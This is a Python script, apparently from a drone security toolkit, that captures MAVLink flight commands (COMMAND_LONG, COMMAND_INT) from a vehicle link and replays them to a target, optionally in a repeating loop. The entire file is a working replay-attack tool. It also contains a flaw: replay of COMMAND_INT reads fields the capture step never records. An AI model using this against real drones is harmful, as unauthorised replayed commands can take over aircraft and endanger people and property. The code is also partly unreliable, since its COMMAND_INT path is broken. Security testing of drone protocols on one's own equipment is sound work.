#!/usr/bin/env python3
"""
Command Replay Attack Script
Captures and replays legitimate MAVLink commands
"""

import sys
import time
import json
from pathlib import Path
from pymavlink import mavutil

def capture_commands(connection, duration=60, output_file=None):
    """
    Capture MAVLink commands for replay
    
    Args:
        connection: MAVLink connection object
        duration: Capture duration in seconds
        output_file: File to save captured commands
    """
    print(f"[*] Capturing MAVLink commands for {duration} seconds...")
    
    commands = []
    start_time = time.time()
    
    try:
        while (time.time() - start_time) < duration:
            msg = connection.recv_match(type=['COMMAND_LONG', 'COMMAND_INT'], blocking=True, timeout=1)
            if msg is None:
                continue
            
            command = {
                'timestamp': time.time(),
                'type': msg.get_type(),
                'command': msg.command,
                'target_system': msg.target_system,
                'target_component': msg.target_component,
                'confirmation': msg.confirmation if hasattr(msg, 'confirmation') else 0,
                'param1': msg.param1,
                'param2': msg.param2,
                'param3': msg.param3,
                'param4': msg.param4,
                'param5': msg.param5 if hasattr(msg, 'param5') else 0,
                'param6': msg.param6 if hasattr(msg, 'param6') else 0,
                'param7': msg.param7 if hasattr(msg, 'param7') else 0
            }
            
            commands.append(command)
            print(f"[+] Captured command: {msg.command} at {time.time() - start_time:.1f}s")
            
    except KeyboardInterrupt:
        print("\n[*] Stopping capture...")
    
    # Save commands
    if output_file:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump(commands, f, indent=2)
        print(f"[+] Saved {len(commands)} commands to {output_file}")
    
    return commands

def replay_commands(connection, commands, delay=1.0, repeat=False):
    """
    Replay captured commands
    
    Args:
        connection: MAVLink connection object
        commands: List of captured commands
        delay: Delay between commands in seconds
        repeat: If True, repeat commands in loop
    """
    print(f"[*] Replaying {len(commands)} commands...")
    print(f"[*] Delay between commands: {delay} seconds")
    
    target_system = connection.target_system
    target_component = connection.target_component
    
    try:
        while True:
            for i, cmd in enumerate(commands):
                print(f"[*] Replaying command {i+1}/{len(commands)}: {cmd['command']}")
                
                if cmd['type'] == 'COMMAND_LONG':
                    connection.mav.command_long_send(
                        target_system,
                        target_component,
                        cmd['command'],
                        cmd['confirmation'],
                        cmd['param1'],
                        cmd['param2'],
                        cmd['param3'],
                        cmd['param4'],
                        cmd['param5'],
                        cmd['param6'],
                        cmd['param7']
                    )
                elif cmd['type'] == 'COMMAND_INT':
                    connection.mav.command_int_send(
                        target_system,
                        target_component,
                        cmd['frame'],
                        cmd['command'],
                        cmd['current'],
                        cmd['autocontinue'],
                        cmd['param1'],
                        cmd['param2'],
                        cmd['param3'],
                        cmd['param4'],
                        int(cmd['x']),
                        int(cmd['y']),
                        cmd['z']
                    )
                
                time.sleep(delay)
            
            if not repeat:
                break
            
            print("[*] Repeating command sequence...")
            
    except KeyboardInterrupt:
        print("\n[*] Stopping replay...")
    
    print("[+] Command replay complete")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 command_replay.py <connection> <action> [options]")
        print("\nActions:")
        print("  capture <file> [duration]  Capture commands to file")
        print("  replay <file> [delay]      Replay commands from file")
        print("\nExample: python3 command_replay.py udp:127.0.0.1:14550 capture commands.json 60")
        print("Example: python3 command_replay.py udp:127.0.0.1:14550 replay commands.json 2")
        print("Example: python3 command_replay.py udp:127.0.0.1:14550 replay commands.json 1 --repeat")
        print("\nOptions:")
        print("  --repeat                  Repeat command sequence in loop")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    action = sys.argv[2]
    
    if action not in ['capture', 'replay']:
        print(f"[-] Unknown action: {action}")
        print("[*] Valid actions: capture, replay")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    if action == 'capture':
        if len(sys.argv) < 4:
            print("[-] Missing output file")
            sys.exit(1)
        
        output_file = sys.argv[3]
        # Validate output file path
        output_path = Path(output_file)
        try:
            output_path.parent.mkdir(parents=True, exist_ok=True)
            test_file = output_path.parent / ".write_test"
            test_file.touch()
            test_file.unlink()
        except (OSError, PermissionError) as e:
            print(f"[-] Cannot write to output file '{output_file}': {e}")
            sys.exit(1)
        
        try:
            duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
            if duration < 0:
                raise ValueError("Duration cannot be negative")
            if duration > 3600:
                print("[!] Warning: Duration exceeds 1 hour")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid duration: {e}")
            sys.exit(1)
        
        commands = capture_commands(connection, duration, output_file)
        print(f"\n[+] Captured {len(commands)} commands")
    
    elif action == 'replay':
        if len(sys.argv) < 4:
            print("[-] Missing input file")
            sys.exit(1)
        
        input_file = sys.argv[3]
        
        try:
            delay = float(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].replace('.', '').isdigit() else 1.0
            if delay < 0:
                raise ValueError("Delay cannot be negative")
            if delay > 60:
                print("[!] Warning: Delay exceeds 60 seconds")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid delay: {e}")
            sys.exit(1)
        
        repeat = '--repeat' in sys.argv
        
        # Load commands
        input_path = Path(input_file)
        if not input_path.exists():
            print(f"[-] File not found: {input_file}")
            sys.exit(1)
        
        if not input_path.is_file():
            print(f"[-] Path is not a file: {input_file}")
            sys.exit(1)
        
        with open(input_path, 'r') as f:
            commands = json.load(f)
        
        replay_commands(connection, commands, delay, repeat)
    
    else:
        print(f"[-] Unknown action: {action}")
        sys.exit(1)

if __name__ == "__main__":
    main()
